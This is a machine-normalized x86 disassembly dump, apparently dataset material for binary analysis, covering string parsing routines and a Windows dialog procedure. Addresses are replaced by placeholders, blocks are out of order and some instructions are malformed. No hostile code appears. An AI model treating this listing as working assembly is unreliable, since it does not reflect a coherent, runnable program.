cmp [ esp + 0x40 ] esi
jb r-xdata
mov eax [ esp + 0x168 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
call sub_4a73a0
test al al
je r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
push 0xffffffff
add eax 0x2c
push 0x0
push eax
lea ecx [ esp + 0x5c ]
call sub_401dd0
jmp r-xdata
sub eax edx
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
call sub_4a7440
test al al
jne r-xdata
cmp [ esp + 0xb8 ] esi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x3c ] edi
mov [ esp + 0x2c ] 0x0
jb r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ esp + 0x24 ]
push eax
push r--data
push edx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_401150
test eax eax
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax r--data
lea edx [ eax + 0x1 ]
jmp r-xdata
pop ebp
cmp [ esp + 0x9c ] esi
mov [ esp + 0xb8 ] ebx
mov [ esp + 0xb4 ] edi
mov [ esp + 0xa4 ] 0x0
jb r-xdata
mov edx [ esp + 0xa4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x40 ]
test eax eax
lea ecx [ esp + 0x2c ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x24 ]
sub eax edx
cmp ecx ecx
mov ebp ecx
jae r-xdata
cmp [ esp + 0x80 ] esi
mov [ esp + 0x9c ] ebx
mov [ esp + 0x98 ] edi
mov [ esp + 0x88 ] 0x0
jb r-xdata
mov eax [ esp + 0x88 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push 0x7c
push 0x3c
jmp r-xdata
test ebp ebp
je r-xdata
cmp [ esp + 0x64 ] esi
mov [ esp + 0x80 ] ebx
mov [ esp + 0x7c ] edi
mov [ esp + 0x6c ] 0x0
jb r-xdata
mov ecx [ esp + 0x6c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push 0x1
call sub_4017f0
lea eax [ esp + 0x2c ]
push eax
push ebx
call sub_4a74d0
add esp 0x8
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x60 ] edi
pop edi
cmp eax esi
pop esi
mov [ esp + 0x5c ] ebx
mov [ esp + 0x48 ] 0x0
pop ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
call sub_4a7440
test al al
jne r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
jne r-xdata
cmp [ esp + 0x28 ] 0x10
mov esi [ esp + 0x14 ]
jae r-xdata
mov ecx eax
mov ecx [ esp + 0x174 ]
mov [ fs : 0x0 ] ecx
add esp 0x180
retn
mov eax [ esp + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
lea edx [ esp + 0x10 ]
push edx
mov ecx ebx
call sub_4a73a0
test al al
je r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x14 ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebp [ esp + 0x24 ]
sub eax edx
test ebp ebp
je r-xdata
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
jmp r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
jne r-xdata
cmp [ esp + 0x28 ] 0x10
mov esi [ esp + 0x14 ]
jae r-xdata
mov ecx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax [ ebx + 0x10038 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x14 ]
sub eax edx
test ebp ebp
je r-xdata
mov eax [ ebx + 0x10038 ]
mov edi [ ebx + 0x10034 ]
mov edx [ ebx + 0x10030 ]
lea ecx [ ebx + 0x10028 ]
add eax edi
mov [ esp + 0x48 ] eax
dec eax
cmp edx eax
ja r-xdata
push r--data
push ebx
call sub_4a4220
add esp 0x8
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
push 0xffffffff
add eax 0x2c
push 0x0
push eax
lea ecx [ esp + 0x78 ]
call sub_401dd0
mov ebp [ esp + 0x24 ]
sub eax edx
lea eax [ esp + 0x10 ]
push eax
mov ecx ebx
call sub_4a7440
test al al
jne r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
jne r-xdata
cmp [ esp + 0x28 ] 0x10
mov esi [ esp + 0x14 ]
jae r-xdata
mov ecx eax
mov eax [ ebx + 0x10038 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x14 ]
mov eax [ ebx + 0x10038 ]
mov edi [ ebx + 0x10034 ]
mov edx [ ebx + 0x10030 ]
lea ecx [ ebx + 0x10028 ]
add eax edi
mov [ esp + 0x48 ] eax
dec eax
cmp edx eax
ja r-xdata
push r--data
push ebx
call sub_4a4220
add esp 0x8
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
push 0xffffffff
add eax 0x2c
push 0x0
push eax
lea ecx [ esp + 0x94 ]
call sub_401dd0
sub eax edx
sub_4a7d40
push ebp
mov ebp esp
push 0xffffffff
push sub_4c1d80
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1020c
call sub_4b6180
push ebx
push esi
push edi
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x10 ] esp
call sub_4a72a0
mov eax [ ebp + 0xc ]
xor esi esi
push eax
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] esi
call sub_44f660
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x28 ] 0x0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] 0x2
call sub_4a73a0
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ ebp - 0x17c ]
mov edi 0x10
cmp eax edi
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov ecx [ ebp - 0x28 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp - 0x18 ]
sub eax edx
cmp ecx ecx
mov ebx eax
mov eax ecx
jae r-xdata
mov esi [ ebp - 0x1a0 ]
xor ebx ebx
cmp esi ebx
mov [ ebp - 0x17c ] 0xf
mov [ ebp - 0x180 ] ebx
mov [ ebp - 0x190 ] bl
je r-xdata
mov eax [ ebp - 0x190 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x198 ] ebx
jb r-xdata
mov edi [ ebp - 0x19c ]
cmp esi edi
je r-xdata
cmp eax ebx
jb r-xdata
cmp eax ebx
mov ecx eax
jb r-xdata
cmp [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1a8 ] 0xf
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x1bc ] 0x0
jb r-xdata
mov ecx [ ebp - 0x1bc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edi 0x10
push esi
call sub_4a3c90
add esi 0x38
add esp 0x4
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
xor edx edx
cmp eax ebx
setne dl
test edx edx
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
mov ecx ebx
lea ecx [ ebp - 0x1f4 ]
mov [ ebp - 0x1c8 ] 0xf
mov [ ebp - 0x1cc ] ebx
mov [ ebp - 0x1dc ] 0x0
call sub_4a7190
lea ecx [ ebp - 0x1021c ]
call sub_44f5f0
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1dc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ ebp - 0x1a0 ]
mov [ ebp - 0x38 ] edx
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x1021c ]
call sub_4a73a0
test al al
je r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ ebp - 0x28 ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp - 0x18 ]
sub eax edx
cmp ebx ebx
mov ecx eax
mov [ ebp - 0x30 ] ecx
mov eax ebx
jae r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x30 ]
cmp eax ecx
jb r-xdata
cmp eax ecx
jae r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
xor edx edx
cmp eax ecx
setne dl
test edx edx
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
mov ecx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx ebx
mov [ ebp - 0x30 ] eax
mov eax ebx
jae r-xdata
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1e8 ]
mov edx [ ebp - 0x1e4 ]
lea eax [ edx + ecx ]
lea ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
cmp edx eax
ja r-xdata
lea eax [ ebp - 0x1021c ]
push r--data
push eax
call sub_4a4220
add esp 0x8
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov ecx [ ebp - 0x30 ]
cmp eax ecx
jb r-xdata
mov ecx [ ebp - 0x30 ]
cmp eax ecx
jae r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov esi [ ebp + 0x8 ]
push 0xffffffff
add eax 0x2c
push 0x0
lea ecx [ esi + 0x1f8 ]
push eax
call sub_401dd0
push r--data
lea edx [ ebp - 0xac ]
push edx
lea ecx [ ebp - 0x1021c ]
call sub_4a6250
push 0xffffffff
push 0x0
lea ecx [ esi + 0x284 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_401dd0
cmp [ ebp - 0x94 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
sub eax edx
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
xor edx edx
cmp eax ecx
setne dl
test edx edx
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
mov ecx eax
mov [ ebp - 0x94 ] 0xf
mov [ ebp - 0x98 ] 0x0
mov [ ebp - 0xa8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
cmp eax ebx
jb r-xdata
cmp eax ebx
mov ecx eax
jb r-xdata
mov edx [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1e4 ]
add eax edx
lea ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
cmp edx eax
ja r-xdata
lea ecx [ ebp - 0x1021c ]
push r--data
push ecx
call sub_4a4220
add esp 0x8
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov eax r--data
lea edx [ eax + 0x1 ]
nop
xor edx edx
cmp eax ebx
setne dl
test edx edx
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov esi [ ebp - 0x28 ]
jae r-xdata
mov ecx ebx
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov ecx [ ebp + 0x8 ]
push 0xffffffff
add eax 0x2c
push 0x0
add ecx 0x24c
push eax
call sub_401dd0
jmp r-xdata
sub eax edx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebp - 0x18 ]
push eax
push r--data
push edx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_401150
test eax eax
jne r-xdata
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
mov edi r--data
xor edx edx
[ esi ] [ edi ]
je r-xdata
lea esi [ ebp - 0x28 ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
add ecx 0x188
push eax
call sub_401dd0
jmp r-xdata
mov ecx [ ebp - 0x1e4 ]
mov eax [ ebp - 0x1e8 ]
add eax ecx
lea ecx [ ebp - 0x1f4 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
cmp edx eax
ja r-xdata
lea edx [ ebp - 0x1021c ]
push r--data
push edx
call sub_4a4220
add esp 0x8
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ ebp - 0x18 ]
push r--data
push eax
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_401150
test eax eax
jne r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov esi [ ebp + 0x8 ]
push 0xffffffff
add eax 0x2c
push 0x0
lea ecx [ esi + 0x16c ]
push eax
call sub_401dd0
push r--data
lea eax [ ebp - 0xe4 ]
push eax
lea ecx [ ebp - 0x1021c ]
call sub_4a6250
push 0xffffffff
push 0x0
lea ecx [ esi + 0x2a0 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_401dd0
cmp [ ebp - 0xcc ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
sub eax edx
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
add ecx 0x268
push eax
call sub_401dd0
jmp r-xdata
mov [ ebp - 0xcc ] 0xf
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp - 0x18 ]
sub eax edx
push eax
push r--data
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_401150
test eax eax
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
add ecx 0x2bc
push eax
call sub_401dd0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebp - 0x18 ]
push eax
push r--data
push edx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_401150
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
add ecx 0x54
push eax
call sub_401dd0
jmp r-xdata
lea edx [ ebp - 0x2c ]
push r--data
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
lea edx [ ebp - 0x2c ]
push r--data
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
push r--data
lea eax [ ebp - 0x15c ]
push eax
lea ecx [ ebp - 0x1021c ]
call sub_4a6250
push r--data
push eax
mov [ ebp - 0x4 ] 0x5
call sub_401380
add esp 0x8
lea ecx [ ebp - 0x15c ]
mov bl al
mov [ ebp - 0x4 ] 0x2
call sub_4480e0
test bl bl
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp - 0x140 ]
push r--data
push ecx
add esi 0x32c
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x140 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov [ ebp - 0x3c ] 0xf
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] 0xb
call sub_4a73a0
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x178 ]
push ecx
lea ecx [ ebp - 0x1021c ]
call sub_4a6250
push r--data
push eax
mov [ ebp - 0x4 ] 0x8
call sub_401380
add esp 0x8
lea ecx [ ebp - 0x178 ]
mov bl al
mov [ ebp - 0x4 ] 0x2
call sub_4480e0
test bl bl
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
call sub_4a73a0
test al al
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
lea eax [ ebp - 0x120 ]
push r--data
push eax
add esi 0x32c
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x120 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp - 0x38 ]
add ecx 0xf
imul ecx ecx 0x1c
push eax
add ecx [ ebp + 0x8 ]
call sub_4023a0
inc [ ebp - 0x38 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0x54 ]
add ecx 0x230
push edx
call sub_401dd0
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_4480e0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x1021c ]
call sub_4a73a0
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
xor esi esi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x120 ]
push ecx
mov ecx esi
call sub_401e80
jmp r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x140 ]
push edx
mov ecx esi
call sub_401e80
jmp r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
mov ecx [ ebp + 0x8 ]
push eax
add ecx 0x348
call sub_4023a0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
xor edi edi
lea edx [ ebp - 0x2c ]
push r--data
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea edx [ ebp - 0x54 ]
push edx
lea eax [ ebp - 0x1021c ]
push eax
call sub_4a74d0
add esp 0x8
push 0x7c
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_4017f0
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push eax
lea ecx [ esi + 0x2d8 ]
call sub_4023a0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push eax
lea ecx [ edi + 0x118 ]
call sub_4023a0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
mov eax 0xf
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xb4 ] edi
mov [ ebp - 0xc4 ] 0x0
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x8c ] 0x0
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] 0xa
call sub_4a73a0
test al al
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
mov eax 0xf
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] 0x0
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x6c ] 0x0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
mov [ ebp - 0x4 ] 0x7
call sub_4a73a0
test al al
je r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ esi + 0x2f4 ]
call sub_4211e0
lea ecx [ ebp - 0x90 ]
call sub_41f020
lea ecx [ ebp - 0xc8 ]
mov ebx eax
call sub_41f020
sub ebx eax
push ebx
lea ecx [ esi + 0x310 ]
call sub_421150
lea ecx [ ebp - 0x90 ]
call sub_4480e0
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x2
call sub_4480e0
lea esp [ esp ]
jmp r-xdata
lea edx [ ebp - 0x70 ]
push edx
lea ecx [ edi + 0x134 ]
call sub_4211e0
lea ecx [ ebp - 0x70 ]
call sub_41f020
lea ecx [ ebp - 0x100 ]
mov ebx eax
call sub_41f020
sub ebx eax
push ebx
lea ecx [ edi + 0x150 ]
call sub_421150
lea ecx [ ebp - 0x70 ]
call sub_4480e0
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x2
call sub_4480e0
lea edx [ ebp - 0x2c ]
push r--data
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
lea ecx [ ebp - 0xc8 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x100 ]
call sub_401dd0
jmp r-xdata
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
lea ecx [ ebp - 0x90 ]
push eax
call sub_4023a0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x1021c ]
call sub_4a7440
test al al
jne r-xdata
lea ecx [ ebp - 0x1021c ]
call sub_4a6200
push eax
lea ecx [ ebp - 0x70 ]
call sub_4023a0
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
sub_4a89c0
mov eax [ esp + 0x8 ]
sub eax 0x110
push ebx
push esi
push edi
je r-xdata
mov eax [ rw-data ]
mov ebx 0x10
cmp eax ebx
mov eax [ rw-data ]
jae r-xdata
dec eax
jne r-xdata
mov esi [ esp + 0x10 ]
mov edi [ SetDlgItemTextA@IAT ]
push eax
push 0x410
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
movzx eax [ esp + 0x18 ]
dec eax
je r-xdata
push eax
push 0x411
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
mov esi [ esp + 0x10 ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0xe
push 0x410
push esi
call edi
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
dec eax
jne r-xdata
push eax
push 0x412
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov eax [ esp + 0x10 ]
push 0x2
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
push eax
push 0x415
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
mov ecx [ rw-data ]
push ebp
mov ebp [ GetDlgItemTextA@IAT ]
inc ecx
push ecx
push eax
push 0x410
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x411
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push eax
push 0x413
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
push eax
push 0x414
push esi
call edi
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
mov edx [ rw-data ]
inc edx
push edx
push eax
push 0x411
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x412
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push eax
push 0x416
push esi
call edi
push 0x410
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
mov eax rw-data
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
push eax
push 0x412
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x415
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov edx [ rw-data ]
inc edx
push edx
push eax
push 0x415
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x413
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
push eax
push 0x413
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x414
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov edx [ rw-data ]
inc edx
push edx
push eax
push 0x414
push esi
call ebp
push 0x0
push 0x0
push 0xe
push 0x416
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
cmp eax ecx
ja r-xdata
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
sub eax ecx
push 0x0
push eax
mov ecx rw-data
call sub_4017f0
